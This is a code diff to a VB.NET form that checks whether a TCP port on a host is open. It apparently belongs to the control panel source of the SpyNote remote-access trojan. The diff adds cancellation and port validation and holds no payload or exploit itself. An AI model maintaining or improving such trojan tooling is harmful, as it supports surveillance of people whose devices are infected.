@@ -7,7 +7,7 @@ Imports SpyNote_V6._4.SN.SpyNote.Stores
 
 Public Class OpenPort
     Private bStat As Boolean
-
+    Private cancelPortCheck As Boolean
     Private Threading_0 As Thread
     Private Sub aData(ByVal b As Object)
         Dim str As String
@@ -28,27 +28,38 @@ Public Class OpenPort
         End If
     End Sub
     Private Sub IsPortOpen(ByVal ar As Array)
+        If cancelPortCheck Then Return
         Dim flag As Boolean
         Dim tcpClient As System.Net.Sockets.TcpClient = Nothing
         Try
+            Dim host As String = Conversions.ToString(ar.GetValue(0))
+            Dim port As Integer
+            If Not PortParseHelper.TryParsePort(Conversions.ToString(ar.GetValue(1)), port) Then
+                Me.aData(False)
+                Me.bStat = False
+                Return
+            End If
             Try
-                tcpClient = New System.Net.Sockets.TcpClient(Conversions.ToString(ar.GetValue(0)), Conversions.ToInteger(ar.GetValue(1)))
+                tcpClient = New System.Net.Sockets.TcpClient(host, port)
                 flag = True
             Catch socketException As System.Net.Sockets.SocketException
                 flag = False
             End Try
+        Catch
+            flag = False
         Finally
             If (tcpClient IsNot Nothing) Then
                 tcpClient.Close()
             End If
         End Try
-        Me.aData(flag)
+        If Not cancelPortCheck Then
+            Me.aData(flag)
+        End If
         Me.bStat = False
     End Sub
     Private Sub OpenPort_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
-        If (Me.bStat) Then
-            Me.Threading_0.Abort()
-        End If
+        cancelPortCheck = True
+        Me.bStat = False
     End Sub
 
     Private Sub OpenPort_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
@@ -66,8 +77,14 @@ Public Class OpenPort
         If (Not Versioned.IsNumeric(Me.textport.Text.Trim())) Then
             Me.ThemeButton1.Enabled = True
         Else
+            Dim port As Integer
+            If Not PortParseHelper.TryParsePort(Me.textport.Text.Trim(), port) Then
+                Me.ThemeButton1.Enabled = True
+                Return
+            End If
+            cancelPortCheck = False
             Me.Threading_0 = New Thread(Sub(a0 As Object) Me.IsPortOpen(DirectCast(a0, Array)))
-            Dim arrays As Array = DirectCast((New String() {Me.textIP.Text.Trim(), Me.textport.Text.Trim()}), Array)
+            Dim arrays As Array = DirectCast((New String() {Me.textIP.Text.Trim(), port.ToString()}), Array)
             Me.bStat = True
             Me.Threading_0.Start(arrays)
         End If
